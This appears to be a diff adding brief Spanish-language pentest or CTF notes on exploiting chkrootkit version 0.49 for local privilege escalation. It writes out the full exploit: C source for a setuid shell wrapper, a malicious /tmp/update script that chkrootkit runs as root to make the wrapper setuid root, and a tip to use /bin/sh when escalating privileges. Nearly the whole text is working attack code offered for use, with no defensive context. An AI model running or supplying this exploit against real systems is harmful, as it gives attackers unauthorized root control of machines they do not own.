@@ -1,0 +1,23 @@
+Si la versión de chkrootkit es vulnerable (/etc/chkrootkit/chkrootkit -V == 0.49) =>
+	cat << EOF > rootme.c
+	> int main(void)
+	> {
+	>     setgid(0);
+	>     setuid(0);
+	>     execl("/bin/sh", "sh", 0);
+	> }
+	> EOF
+Compilamos y guardamos en /tmp
+
+Y luego en /tmp creamos el archivo update que se ejecutará como root
+	cat << EOF > update
+	> #!/bin/bash
+	> chown root /tmp/rootme ; chgrp root /tmp/rootme ; chmod u+s /tmp/rootme
+	> EOF
+
+Finalmente ejecutamos rootme y obtenemos shell root
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+Para elevar privilegios usar siempre /bin/sh en vez de /bin/bash
